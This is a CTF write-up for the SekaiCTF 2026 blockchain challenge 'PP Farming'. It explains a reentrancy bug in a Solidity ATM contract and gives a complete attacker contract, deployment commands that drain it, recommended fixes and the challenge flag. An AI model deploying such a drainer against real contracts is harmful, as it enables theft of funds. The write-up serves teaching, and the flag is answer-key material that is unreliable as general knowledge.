---
title: "PP Farming"
ctf: "SekaiCTF 2026"
date: 2026-07-01
category: blockchain
difficulty: easy
points: 0
flag_format: "SEKAI{...}"
author: "sid"
---

# PP Farming

## Summary

`PerformancePointATM` credits a `scores[address]` mapping on donation, then lets
you withdraw it back. `withdrawPP()` sends ETH out via a raw `.call` *before*
zeroing the caller's score, a textbook checks-effects-interactions violation.
An attacker contract re-enters `withdrawPP()` from its `receive()` hook and
drains the ATM in a loop.

## Background: how reentrancy actually works

Reentrancy is one of those bugs that sounds obvious in retrospect but has drained
hundreds of millions of dollars in practice. The DAO hack in 2016 (the one that
split Ethereum into ETH and ETC) was exactly this pattern at scale.

The root issue is that Ethereum smart contract calls are synchronous and
re-entrant by default. When contract A calls contract B, B's code runs
*immediately*, and B can call back into A before A has finished updating its own
state. There's no isolation, no lock, no thread boundary. Just nested call
frames on the same EVM stack.

The traditional safe ordering is **Checks-Effects-Interactions** (CEI):

1. **Checks**: validate inputs and preconditions
2. **Effects**: update your own state
3. **Interactions**: call external contracts

If you flip Effects and Interactions (send ETH first, then zero the balance),
you've created a re-entrancy window. The external call hands control to the
recipient, and if the recipient is a contract, its `receive()` or `fallback()`
runs while your state is still stale.

One thing worth understanding is *why* `.call` is the dangerous option here.
Solidity's older `transfer()` and `send()` limited the callee to 2300 gas, just
enough to emit an event but not enough to make another external call. That gas cap
killed re-entrancy in practice. But in EIP-1884 (Istanbul, 2019), `SLOAD` got
repriced from 200 to 800 gas, and suddenly 2300 gas wasn't even enough for some
legitimate `receive()` functions. The community stopped recommending `transfer()`
and `send()`, and `.call{value: x}("")` became the standard. The trade-off: more
reliable delivery, no gas cap, and all the re-entrancy risk that comes with it.

The correct fix is either CEI ordering *or* a reentrancy guard (mutex), not
the gas-limit trick, which is fragile.

## Solution

### Step 1: Spot the reentrancy

```solidity
function withdrawPP() public {
    uint256 score = scores[msg.sender];
    require(score > 0, "Nothing to withdraw");
    (bool result, ) = msg.sender.call{value: score}("");   // <-- external call first
    require(result, "Transfer failed");
    scores[msg.sender] = 0;                                 // <-- effect happens after
}
```

`scores[msg.sender]` is only zeroed *after* the external call returns. If
`msg.sender` is a contract with a `receive()` hook, that hook runs mid-call
while `scores[msg.sender]` is still non-zero, so it can call `withdrawPP()`
again and again until the ATM's balance is empty. `isSolved()` checks
`address(this).balance == 0`.

The call tree for a single `attack()` invocation looks like this:

```
Exploit.attack()
  └─ ATM.donatePP{1 ETH}()
  └─ ATM.withdrawPP()                    ← scores[exploit] = 1 ETH
       └─ exploit.receive()              ← re-enters while score still 1 ETH
            └─ ATM.withdrawPP()          ← scores[exploit] still 1 ETH
                 └─ exploit.receive()
                      └─ ATM.withdrawPP()
                           └─ ...until ATM balance = 0
```

Each nested call sees `scores[msg.sender] == 1 ETH` because the zero-out never
ran. The ATM started with 10 ETH, so 10 recursive calls drain it completely.

If you want to think about it formally: let $B_i$ be the ATM balance after
$i$ recursive withdrawals, and let $d = 1\ \text{ETH}$ be the seed deposit.
Since the score is never cleared between calls:

$$B_0 = 10\ \text{ETH}, \quad B_{i+1} = B_i - d$$

The loop terminates when $B_i = 0$, i.e. after $B_0 / d = 10$ re-entrant calls.

### Step 2: Attacker contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IPerformancePointATM {
    function donatePP(address _to) external payable;
    function withdrawPP() external;
}

contract Exploit {
    IPerformancePointATM public target;
    uint256 public count;

    constructor(address _target) {
        target = IPerformancePointATM(_target);
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "need 1 ether seed");
        count = 0;
        target.donatePP{value: msg.value}(address(this));
        target.withdrawPP();
    }

    receive() external payable {
        if (address(target).balance > 0 && count < 20) {
            count++;
            target.withdrawPP();
        }
    }

    function drain(address payable to) external {
        to.transfer(address(this).balance);
    }
}
```

Donate 1 ether to seed a positive score, call `withdrawPP()`, and let
`receive()` recursively call `withdrawPP()` again on every incoming transfer
until the ATM (funded with 10 ether) is fully drained.

The `count < 20` guard isn't strictly required. The `address(target).balance > 0`
check handles termination. But it's good practice to avoid hitting the EVM call
stack depth limit (1024 frames) on longer attacks.

### Step 3: Deploy and trigger

```bash
forge create --rpc-url $RPC_URL --private-key $PK \
    src/Exploit.sol:Exploit --constructor-args $ATM_ADDR

cast send $EXPLOIT 'attack()' --value 1ether --rpc-url $RPC_URL --private-key $PK
cast send $EXPLOIT 'drain(address)' $PLAYER --rpc-url $RPC_URL --private-key $PK
cast call $ATM_ADDR 'isSolved()' --rpc-url $RPC_URL
```

`isSolved()` returns `true` once the ATM balance hits zero.

## What a real fix looks like

The two legitimate defenses:

**CEI ordering**: zero the score before the external call.

```solidity
function withdrawPP() public {
    uint256 score = scores[msg.sender];
    require(score > 0, "Nothing to withdraw");
    scores[msg.sender] = 0;                    // effect first
    (bool result, ) = msg.sender.call{value: score}("");
    require(result, "Transfer failed");
}
```

**Reentrancy guard**: OpenZeppelin's `ReentrancyGuard` sets a `_status` flag to
`ENTERED` at the start of the function and reverts if it's already set.

```solidity
uint256 private _status = NOT_ENTERED;

modifier nonReentrant() {
    require(_status != ENTERED, "ReentrancyGuard: reentrant call");
    _status = ENTERED;
    _;
    _status = NOT_ENTERED;
}
```

Either works. CEI is preferable because it's zero-cost and compositional. You
don't need to remember to add a modifier to every function. Reentrancy guards
are useful when CEI is genuinely impossible (e.g. you need to know if the
transfer succeeded before updating state), but that case is rare.

## Flag

```
SEKAI{3Z_re3ntr4ncy_atTack5}
```
